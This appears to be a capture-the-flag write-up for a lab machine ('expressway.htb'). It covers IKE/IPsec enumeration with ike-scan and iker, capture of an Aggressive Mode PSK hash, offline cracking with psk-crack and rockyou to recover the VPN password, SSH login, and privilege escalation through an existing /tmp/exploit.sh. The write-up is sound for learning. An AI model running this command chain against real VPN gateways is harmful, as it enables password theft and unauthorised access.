==SCAN==

```
PORT    STATE SERVICE
500/udp open  isakmp
| ike-version: 
|   attributes: 
|     XAUTH
|_    Dead Peer Detection v1.0
```

After this, I download this repo: `https://github.com/Zamanry/iker`

So with this we get: 

```
[*] The IKE service could be discovered which should be restricted to only necessary parties 
[*] The following weak IKE version was supported: version 1 
[*] The IKE service could be fingerprinted by analyzing the responses received: Linksys Etherfast 
[*] Weak encryption algorithms are those considered broken by industry standards or key length is less than 128 bits. 
[*] The following weak encryption algorithm was supported: 3DES 
[*] Weak hash algorithms are those considered broken by industry standards. 
[*] The following weak hash algorithm was supported: SHA-1 
[*] Weak key exchange groups are those considered broken by industry standards or modulus is less than 2048 bits. 
[*] The following weak key exchange group supported: Diffie-Hellman group 2 (MODP-1024) [*] Weak authentication methods are those not using multifactor authentication or not requiring mutual authentication. 
[*] The following weak authentication method was supported: PSK 
[*] The following moderate authentication method was supported: RSA signatures 
[*] The following weak authentication method was supported: Hybrid RSA signatures 
[*] The following weak authentication method was supported: Hybrid DSA signatures 
[*] Aggressive Mode was accepted by the IKE service which should be disabled Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800 
[*] Aggressive Mode transmits group name without encryption
```

This result is **PURE GOLD** from a pentesting/vulnerability perspective in IPsec VPNs.

What you found on that host is **a combination of insecure configurations + Aggressive Mode + PSK**, which has historically allowed **OFFLINE** attacks to obtain the VPN password.

Now I try this: `sudo ike-scan --aggressive --multiline --id Group 10.10.11.87`
And obtain:
```
10.10.11.87 Aggressive Mode Handshake returned HDR=(CKY-R=c51f818a0524faff) 
SA=(Enc=3DES 
Hash=SHA1 
Group=2:modp1024 
Auth=PSK 
LifeType=Seconds 
LifeDuration=28800) 
KeyExchange(128 bytes) 
Nonce(32 bytes) 
ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) 
VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

```

This is an a `Agressive Mode Handshake valid with PSK`
`ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)`
# Why is this gold?

Because an Aggressive Mode handshake **includes enough material to reconstruct the PSK hash**, and that can be cracked just like a WPA/WPA2 handshake.1

Generate a valid file:
`sudo ike-scan --aggressive --id ike@expressway.htb --pskcrack=ike_psk.txt 10.10.11.87`

Crack the pass:
`psk-crack -d /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt ike_psk.txt`
This reveal: `"freakingrockstarontheroad"`

Connect by ssh with these credentials

After run `/linpeas.sh` I found `/exploit.sh` in `/tmp`, executing this we get root privileges.

